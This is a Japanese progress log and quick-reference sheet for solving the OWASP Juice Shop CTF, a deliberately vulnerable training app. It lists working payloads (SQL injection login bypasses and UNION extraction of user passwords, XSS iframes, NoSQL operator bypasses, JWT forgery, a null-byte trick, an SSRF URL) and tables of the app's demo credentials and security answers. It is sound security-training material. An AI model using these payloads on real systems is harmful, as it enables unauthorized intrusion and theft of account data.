# OWASP Juice Shop CTF

**進捗:** 69/110 (63%) | **最終更新:** 2026-01-31

## 難易度別進捗

| 難易度 | 解決 | 合計 | 詳細 |
|--------|------|------|------|
| ⭐ | 10 | 14 | 基本的なチャレンジ |
| ⭐⭐ | 13 | 15 | 中級チャレンジ |
| ⭐⭐⭐ | 11 | 24 | 上級チャレンジ |
| ⭐⭐⭐⭐ | 15 | 25 | 高度なチャレンジ |
| ⭐⭐⭐⭐⭐ | 13 | 20 | エキスパートチャレンジ |
| ⭐⭐⭐⭐⭐⭐ | 7 | 12 | 最難関チャレンジ |

## セッション記録

| 日付 | クリア数 | 詳細 |
|------|----------|------|
| 2026-01-30 | 44問 | 初期セッション |
| 2026-01-31 AM | 33問 | ソースコード分析 |
| 2026-01-31 PM | 64問 | +31問 (curl で自動攻撃) |
| 2026-01-31 夜 | 69問 | +5問 (難易度6集中攻略) |

---

## 解決済みチャレンジ一覧

### 難易度1 (14問) ✅ 完全クリア

| チャレンジ | カテゴリ | 解法 |
|-----------|---------|------|
| Score Board | Miscellaneous | `/#/score-board` にアクセス |
| DOM XSS | XSS | `<iframe src="javascript:alert('xss')">` |
| Confidential Document | Sensitive Data Exposure | `/ftp/acquisitions.md` |
| Exposed Metrics | Observability Failures | `/metrics` |
| Zero Stars | Improper Input Validation | API で `rating: 0` を送信 |
| Error Handling | Security Misconfiguration | 無効な URL でスタックトレース表示 |
| Outdated Allowlist | Unvalidated Redirects | 古い暗号通貨アドレスにリダイレクト |
| Privacy Policy | Miscellaneous | `/#/privacy-security/privacy-policy` |
| Web3 Sandbox | Broken Access Control | `/#/web3-sandbox` |
| Bonus Payload | XSS | SoundCloud iframe ペイロード |
| Bully Chatbot | Miscellaneous | クーポンをしつこく要求 |
| Mass Dispel | Miscellaneous | Shift+クリックで通知を一括閉じ |
| Repetitive Registration | Improper Input Validation | 空ユーザー登録時に自動クリア |
| Missing Encoding | Improper Input Validation | `#` を `%23` にエンコードして猫画像取得 |

### 難易度2 (14問)

| チャレンジ | カテゴリ | 解法 |
|-----------|---------|------|
| Login Admin | Injection | `' OR 1=1--` で SQLi ログイン |
| Admin Section | Broken Access Control | `/#/administration` |
| Password Strength | Broken Authentication | `admin123` で直接ログイン |
| Security Policy | Miscellaneous | `/.well-known/security.txt` |
| Deprecated Interface | Security Misconfiguration | XML ファイルをアップロード |
| Login MC SafeSearch | Broken Authentication | パスワード `Mr. N00dles` (歌詞から) |
| Login Bender | Injection | `bender@juice-sh.op'--` で SQLi |
| View Basket | Broken Access Control | `/rest/basket/1` で他人のバスケット閲覧 (IDOR) |
| Five-Star Feedback | Broken Access Control | API で5つ星フィードバックを削除 |
| Empty User Registration | Improper Input Validation | 空の email/password で登録 |
| Meta Geo Stalking | Sensitive Data Exposure | EXIF から `Daniel Boone National Forest` |
| Visual Geo Stalking | Sensitive Data Exposure | 写真から `ITsec` を特定 |
| Weird Crypto | Cryptographic Issues | MD5 使用を Contact で報告 |
| NFT Takeover | Sensitive Data Exposure | シードフレーズから秘密鍵を導出 |

### 難易度3 (24問) ✅ 完全クリア

| チャレンジ | カテゴリ | 解法 |
|-----------|---------|------|
| Login Jim | Injection | `jim@juice-sh.op'--` で SQLi |
| Database Schema | Injection | UNION SQLi で sqlite_master 抽出 |
| Bjoern's Favorite Pet | Broken Authentication | セキュリティ質問: `Zaya` |
| Forged Feedback | Broken Access Control | `UserId` を偽装して投稿 |
| XXE Data Access | XXE | XML 外部エンティティで `/etc/passwd` 読取 |
| Payback Time | Improper Input Validation | `quantity: -100` で負の金額注文 |
| Forged Review | Broken Access Control | `author` パラメータを偽装 |
| Reset Jim's Password | Broken Authentication | セキュリティ質問: `Samuel` |
| Admin Registration | Improper Input Validation | API で `role: 'admin'` を送信 |
| Deluxe Fraud | Improper Input Validation | API で `paymentMode: 'none'` を送信 |
| CAPTCHA Bypass | Broken Anti Automation | 同じ CAPTCHA ID を再利用 |
| Upload Size/Type | Improper Input Validation | 制限を超えるファイルをアップロード |
| Login Amy | Broken Authentication | パスワード `K1f....................` |
| GDPR Data Erasure | Broken Access Control | ユーザー削除機能でデータ消去 |
| Manipulate Basket | Broken Access Control | 他ユーザーのバスケットに商品追加 |
| Privacy Policy Inspection | Security through Obscurity | HTML内の隠しURL発見 |
| Product Tampering | Broken Access Control | 商品説明を改ざん |
| Security Advisory | Sensitive Data Exposure | CSAF SHA512 チェックサムを報告 |
| Ghost Login | Injection | `' or deletedAt IS NOT NULL--` |
| API-only XSS | XSS | `/api/Users` に XSS ペイロード |
| CSRF | Broken Access Control | 別オリジンからユーザー名変更 |
| Mint the Honey Pot | Web3 | BEE トークンで NFT ミント |

### 難易度4 (20問)

| チャレンジ | カテゴリ | 解法 |
|-----------|---------|------|
| User Credentials | Injection | UNION SQLi で全ユーザー情報抽出 |
| Christmas Special | Injection | SQLi で削除済み商品を購入 |
| Poison Null Byte | Improper Input Validation | `%2500` で拡張子チェック回避 |
| Forgotten Developer/Sales Backup | Sensitive Data Exposure | Poison Null Byte でバックアップ取得 |
| Easter Egg | Cryptographic Issues | Base64 + ROT13 デコード |
| Nested Easter Egg | Cryptographic Issues | Easter Egg内のパスにアクセス |
| Access Log | Sensitive Data Exposure | `/support/logs` にアクセス |
| Ephemeral Accountant | Injection | UNION SELECT で会計ユーザー作成 |
| Login Bjoern | Broken Authentication | 逆順Base64パスワード |
| NoSQL Manipulation | Injection | `{"$ne": -1}` で条件バイパス |
| Reset Bender's Password | Broken Authentication | セキュリティ質問: `Stop'n'Drop` |
| Reset Uvogin's Password | Sensitive Data Exposure | セキュリティ質問: `Silence of the Lambs` |
| Vulnerable Library | Vulnerable Components | `sanitize-html 1.4.2` を報告 |
| Legacy Typosquatting | Vulnerable Components | `epilogue-js` を報告 |
| Allowlist Bypass | Unvalidated Redirects | 許可URLをクエリパラメータに付加 |
| Steganography | Security through Obscurity | `Pickle Rick` を報告 |
| Leaked Unsafe Product | Sensitive Data Exposure | `hueteroneel` と `eurogium edule` を報告 |
| Expired Coupon | Improper Input Validation | `window.Date` オーバーライド + `WMNSDY2019` |

### 難易度5 (13問)

| チャレンジ | カテゴリ | 解法 |
|-----------|---------|------|
| Blockchain Hype | Security Misconfiguration | `/#/tokensale-ico-ea` にアクセス |
| Change Bender's Password | Broken Authentication | `current` パラメータを省略 |
| Retrieve Blueprint | Sensitive Data Exposure | `/assets/public/images/products/JuiceShop.stl` |
| Unsigned JWT | Broken Authentication | `alg: none` で JWT を偽造 |
| Extra Language | Localization | 翻訳ファイルを追加 |
| Two Factor Authentication | Broken Authentication | SQLi で TOTP シークレット抽出 |
| NoSQL Exfiltration | Injection | NoSQLi で全ユーザーメール抽出 |
| Token Sale | Security through Obscurity | `/#/tokensale-ico-ea` |
| Login Support Team | Broken Authentication | SQLi でハッシュ取得 → クラック |
| Kill Chatbot | Vulnerable Components | ユーザー名にコードインジェクション |
| Frontend Typosquatting | Vulnerable Components | `ngy-cookie` を報告 |
| Leaked API Key | Sensitive Data Exposure | `6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie` を報告 |
| Leaked Access Logs | Observability Failures | PasteBin の漏洩ログでパスワード発見 |

### 難易度6 (7問)

| チャレンジ | カテゴリ | 解法 |
|-----------|---------|------|
| Forged Coupon | Cryptographic Issues | Z85デコード + 日付操作 + Z85エンコード |
| Forged Signed JWT | Broken Authentication | RS256→HS256 アルゴリズム混乱攻撃 |
| SSRF | Broken Access Control | プロフィール画像URLで内部エンドポイントアクセス |
| Video XSS | XSS | Zip Slip で VTT ファイル上書き |
| Multiple Likes | Broken Anti Automation | 並列POSTリクエストでレースコンディション |
| Login Support Team | Security Misconfiguration | ソースコードからパスワード発見 `J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P` |
| Imaginary Challenge | Cryptographic Issues | hashids で 999 をエンコードして continue code を偽造 |
| Premium Paywall | Cryptographic Issues | 隠しURL `/this/page/is/hidden/behind/an/incredibly/high/paywall/...` にアクセス |

---

## 未解決チャレンジ

### 難易度2 (残り1問)

| チャレンジ | 状態 | メモ |
|-----------|------|------|
| Reflected XSS | Docker無効 | ローカル環境で実行必要 |

### 難易度4 (残り5問)

| チャレンジ | 状態 | メモ |
|-----------|------|------|
| GDPR Data Theft | 未解決 | 他ユーザーのエクスポートURL推測 |
| HTTP-Header XSS | 未解決 | `True-Client-IP` ヘッダーに XSS |
| NoSQL DoS | 未解決 | ReDoS ペイロード |
| CSP Bypass | 未解決 | CSP ヘッダー解析 |
| Server-side XSS Protection | 未解決 | サニタイズバイパス |

### 難易度5-6 (残り12問)

| チャレンジ | 難易度 | 状態 | メモ |
|-----------|--------|------|------|
| Blocked RCE DoS | 6 | Docker無効 | ローカル Node.js 必要 |
| Arbitrary File Write | 6 | Docker無効 | Zip Slip |
| SSTi | 6 | Docker無効 | テンプレートインジェクション |
| Video XSS | 6 | Docker無効 | VTT ファイル XSS |
| Successful RCE DoS | 6 | Docker無効 | ローカル環境必要 |
| Wallet Depletion | 6 | Web3必要 | Ethereum Sepolia テストネット操作 |
| Reset Bjoern's Password | 5 | 未解決 | OAuth 認証フロー脆弱性 |
| XXE DoS | 5 | 未解決 | Billion Laughs 攻撃 |

---

## クイックリファレンス

### SQLi ペイロード

```sql
' OR 1=1--                           -- 管理者ログイン
jim@juice-sh.op'--                   -- 特定ユーザーログイン
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--  -- スキーマ抽出
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--  -- 認証情報抽出
```

### 認証情報

| Email | Password |
|-------|----------|
| admin@juice-sh.op | admin123 |
| jim@juice-sh.op | ncc-1701 |
| bender@juice-sh.op | OhG0dPlease1LubYou |
| mc.safesearch@juice-sh.op | Mr. N00dles |
| testing@juice-sh.op | IamUsedForTesting |
| amy@juice-sh.op | K1f.................... |
| support@juice-sh.op | J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P |
| rsa_lord@juice-sh.op | (JWT偽造でログイン) |

### セキュリティ質問

| Email | 質問 | 答え |
|-------|------|------|
| bjoern@owasp.org | ペットの名前 | Zaya |
| jim@juice-sh.op | 兄弟の名前 | Samuel |
| bender@juice-sh.op | 勤務先 | Stop'n'Drop |
| uvogin@juice-sh.op | 好きな映画 | Silence of the Lambs |
| morty@juice-sh.op | ペットの名前 | 5N0wb41L |

### 主要な攻撃パターン

| パターン | 説明 |
|---------|------|
| Poison Null Byte | `%2500` でファイル拡張子チェック回避 |
| JWT alg:none | 署名検証をバイパス |
| JWT RS256→HS256 | 公開鍵でHMAC署名 |
| NoSQL Injection | `{"$ne": -1}` で条件バイパス |
| Allowlist Bypass | 許可URLをクエリパラメータとして付加 |
| Z85 Encoding | クーポンコードのエンコード形式 |
| SSRF | `http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3` |
| Kill Chatbot | `admin"); processQuery=null; users.addUser("1337", "test'` |
| Hashids Forgery | `new Hashids('this is my salt', 60).encode(999)` で continue code 偽造 |
| Race Condition | 並列リクエストでレースコンディション (Multiple Likes) |

### 重要なAPI/URL

```
/api/Challenges          # チャレンジ一覧
/api/Users               # ユーザー API
/rest/basket/{id}        # バスケット (IDOR)
/rest/captcha            # CAPTCHA
/ftp                     # ファイル一覧
/support/logs            # アクセスログ
/encryptionkeys/jwt.pub  # JWT 公開鍵
/.well-known/csaf/       # セキュリティアドバイザリ
```
